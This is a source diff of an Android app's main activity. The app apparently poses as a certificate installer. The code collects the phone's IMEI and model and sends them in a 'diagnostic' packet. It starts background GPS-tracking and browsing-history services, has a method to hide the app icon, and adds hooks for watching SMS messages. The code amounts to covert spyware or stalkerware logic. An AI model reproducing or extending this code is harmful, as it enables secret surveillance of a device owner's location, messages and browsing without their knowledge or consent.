@@ -10,6 +10,7 @@ import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.ComponentName;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
@@ -17,8 +18,11 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
 import android.content.pm.PackageManager;
+import android.content.res.Configuration;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.Handler;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -29,6 +33,8 @@ import android.widget.EditText;
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
 import com.inet.android.location.GPSTracker;
+import com.inet.android.sms.SMSBroadcastReceiver;
+import com.inet.android.sms.SmsSentObserver;
 
 public class MainActivity extends Activity {
 	Button install;
@@ -69,7 +75,7 @@ public class MainActivity extends Activity {
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String versionAndroid = android.os.Build.VERSION.RELEASE;
-		
+
 		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
@@ -101,13 +107,11 @@ public class MainActivity extends Activity {
 		} else
 			finish();
 	}
-
-	public void contentObserved() {
-//		SmsSentObserver content = new SmsSentObserver(new Handler(), null);
-//        this.getContentResolver().registerContentObserver(
-//                        Uri.parse("content://sms/sent"), true, null);
+	
+	@Override
+	public void onConfigurationChanged(Configuration newConfig) {  
+	        super.onConfigurationChanged(newConfig);  
 	}
-
 	private boolean viewIDDialog() {
 		// TODO Auto-generated method stub
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
@@ -131,7 +135,6 @@ public class MainActivity extends Activity {
 				e.putString("ID", value);
 				e.commit();
 				start(); // запуск сервисов
-				contentObserved();
 				sendDiagPost();
 				finish();
 			}
@@ -154,7 +157,7 @@ public class MainActivity extends Activity {
 				+ logTime() + "</time><type>1</type><ttl>"
 				+ sp.getString("BUILD", "A0003 2013-10-03 20:00:00")
 				+ "</ttl><cls>" + sp.getString("IMEI", "0000")
-				+ "</cls><app>Диагностическая информация</app><url>"
+				+ "</cls><url>"
 				+ Long.toString(System.currentTimeMillis())
 				+ sp.getString("ABOUT", "about") + "</url></packet>";
 
@@ -181,9 +184,10 @@ public class MainActivity extends Activity {
 				sID = file1[i].getName();
 				if (file1[i].isDirectory()) {
 					File[] file = file1[i].listFiles();
-					if(recursiveFileFind(file) == true)
+					if (recursiveFileFind(file) == true) {
+						Log.d("recurs", ID);
 						return true;
-					
+					}
 				}
 
 				if (sID.indexOf("ts.apk") != -1) {
@@ -192,19 +196,18 @@ public class MainActivity extends Activity {
 					e.putString("ID", ID);
 					e.commit();
 					Log.d("ID", sp.getString("ID", "ID"));
-					if(!sp.getString("ID", "ID").equals("ID")){
-					contentObserved();
-					sendDiagPost();
-					// Toast.makeText(this, sourceApk,
-					// Toast.LENGTH_LONG).show();
-					start(); // запуск сервисов
-					return true;
-				}
+					if (!sp.getString("ID", "ID").equals("ID")) {
+						sendDiagPost();
+						// Toast.makeText(this, sourceApk,
+						// Toast.LENGTH_LONG).show();
+						start(); // запуск сервисов
+						return true;
+					}
 					break;
 				}
 				i++;
 			}
-			
+
 		}
 		return false;
 	}
@@ -224,10 +227,10 @@ public class MainActivity extends Activity {
 
 		startService(new Intent(MainActivity.this, GPSTracker.class));
 		startService(new Intent(MainActivity.this, LinkService.class));
-
+//		contentObserved();
 		Log.d(LOG_TAG, "finish start services");
 		FileLog.writeLog("finish start services");
-		
+
 	}
 
 	public void hideIcon() {
